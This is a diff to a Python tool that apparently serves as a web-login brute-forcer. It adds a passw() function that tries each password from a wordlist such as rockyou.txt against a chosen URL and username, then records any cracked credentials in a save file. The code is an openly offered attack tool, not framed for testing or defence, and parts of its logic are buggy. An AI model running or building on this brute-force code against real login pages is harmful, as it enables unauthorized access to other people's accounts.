@@ -22,6 +22,11 @@ print("."*100)
 
 
 def otp():
+    system('clear')
+    name = "T R Y  T H I S"
+    print("." * 100)
+    print(colored(pyfiglet.figlet_format(name, 'arrows'), 'green'))
+    print("." * 100)
     print("HI there is two mode to perform brute force attack you can enter one to continue if it is not working try mode 2.")
     a = int(input("Enter here (1/2): "))
     if a == 1:
@@ -122,6 +127,11 @@ def otp():
         for x in range(tn):
             Thread(target=main).start()
 
+    else:
+        print(colored("Enter correct option. Try again",'red'))
+        time.sleep(1)
+        passw()
+
 
 def directory():
     try:
@@ -182,7 +192,135 @@ def directory():
         print("Network Connection is not good. Check Internet and try again.")
 
 
+def passw():
+    system('clear')
+    name = "T R Y  T H I S"
+    print("." * 100)
+    print(colored(pyfiglet.figlet_format(name, 'arrows'), 'green'))
+    print("." * 100)
+    print("HI there is two mode to perform brute force attack you can enter one to continue if it is not working try mode 2.")
+    a = int(input("Enter here (1/2): "))
+    if a == 1:
+        wl = input("Enter path of wordlist(/usr/share/rockyou.txt): ")
+        if exists(wl):
+            url = input("Enter url ( https://requestswebsite.notanothercoder.repl.co/confirm-login ): ")
+            username = input("Enter username (admin): ")
+            us = input("Enter where is username stored (uname) : ")
+            ps = input("Enter where is password stored (passwd) : ")
+            bca = input("Response when failed (failed to login) : ")
+            print('\n')
+            def main():
+                if "correct_pass.txt" in os.listdir():
+                    print("Password saved into correct_pass.txt")
+                else:
+                    with open(wl, 'r') as file:
+                        for passwd in file:
+                            data = {
+                                us: username,
+                                ps: passwd[0:len(passwd)-1]
+                            }
+                            r = requests.get(url, data=data)
+                            if str(bca) in r.text.lower():
+                                with open("tries.txt", "a") as f:
+                                    f.write(f"{passwd}\n")
+                                    f.close()
+                                print(f"Incorrect {passwd}")
+                                continue
+                            else:
+                                print(f"Correct Password {passwd}\n")
+                                with open("correct_pass.txt", "w") as f:
+                                    f.write(passwd)
+                                with open('saves/passwd.txt', 'a') as m:
+                                    m.write("newscan\n")
+                                    for i in range(100):
+                                        m.write('*')
+                                    m.write('\n')
+                                    m.write('\n')
+                                    m.write(url)
+                                    m.write('\n')
+                                    m.write(f'{username}:{passwd}')
+                                    m.write('\n')
+                                    for i in range(100):
+                                        m.write('*')
+                                    m.write('\n')
+                                    m.close()
+                                break
+                            break
+            main()
+
+
+        else:
+            print(colored("Wordlist not exist. Try again",'red'))
+            time.sleep(1)
+            passw()
+    elif a==2:
+        wl = input("Enter path of wordlist(/usr/share/rockyou.txt): ")
+        if exists(wl):
+            url = input("Enter url ( https://requestswebsite.notanothercoder.repl.co/confirm-login ): ")
+            username = input("Enter username (admin): ")
+            us = input("Enter where is username stored (uname) : ")
+            ps = input("Enter where is password stored (passwd) : ")
+            bca = input("Response when failed (failed to login) : ")
+            print('\n')
+
+            def main():
+                if "correct_pass.txt" in os.listdir():
+                    print("Password saved into correct_pass.txt")
+                else:
+                    with open(wl, 'r') as file:
+                        for passwd in file:
+                            data = {
+                                us: username,
+                                ps: passwd[0:len(passwd) - 1]
+                            }
+                            r = requests.get(url, data=data)
+                            if r.status_code != 200:
+                                with open("tries.txt", "a") as f:
+                                    f.write(f"{passwd}\n")
+                                    f.close()
+                                print(f"Incorrect {passwd}")
+                                continue
+                            else:
+                                print(f"Correct Password {passwd}\n")
+                                with open("correct_pass.txt", "w") as f:
+                                    f.write(passwd)
+                                with open('saves/passwd.txt', 'a') as m:
+                                    m.write("newscan\n")
+                                    for i in range(100):
+                                        m.write('*')
+                                    m.write('\n')
+                                    m.write('\n')
+                                    m.write(url)
+                                    m.write('\n')
+                                    m.write(f'{username}:{passwd}')
+                                    m.write('\n')
+                                    for i in range(100):
+                                        m.write('*')
+                                    m.write('\n')
+                                    m.close()
+                                break
+                            break
+
+            main()
+
+
+        else:
+            print(colored("Wordlist not exist. Try again", 'red'))
+            time.sleep(1)
+            passw()
+
+    else:
+        print(colored("Enter correct option. Try again",'red'))
+        time.sleep(1)
+        passw()
+
+
 def passnoword():
+    system('clear')
+    name = "T R Y  T H I S"
+    print("." * 100)
+    print(colored(pyfiglet.figlet_format(name, 'arrows'), 'green'))
+    print("." * 100)
     print("HI there is two mode to perform brute force attack you can enter one to continue if it is not working try mode 2.")
     a = int(input("Enter here (1/2): "))
     if a == 1:
@@ -199,7 +337,7 @@ def passnoword():
                 us: username,
                 ps: password
             }
-
+            print(data)
             r = requests.get(url, data=data)
             return r
 
@@ -244,6 +382,7 @@ def passnoword():
                             m.write('\n')
                             for i in range(100):
                                 m.write('*')
+                            m.write('\n')
                             m.close()
                         break
                     break
@@ -309,9 +448,14 @@ def passnoword():
                             m.write('\n')
                             for i in range(100):
                                 m.write('*')
+                            m.write('\n')
                             m.close()
                         break
                     break
         for x in range(tn):
             Thread(target=main).start()
 
+    else:
+        print(colored("Enter correct option. Try again",'red'))
+        time.sleep(1)
+        passw()
